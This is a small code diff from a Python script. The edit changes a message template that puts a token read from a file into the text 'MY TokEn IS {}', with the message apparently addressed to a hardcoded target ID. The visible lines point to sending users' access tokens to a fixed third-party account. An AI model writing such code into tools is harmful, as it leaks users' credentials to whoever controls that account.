@@ -39,7 +39,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "HeLLo feliix SīīR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
+      msg_template = "HeLLo SīR ! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
 
       # Specify the ID where you want to send the message
       target_id = "61574791744025"
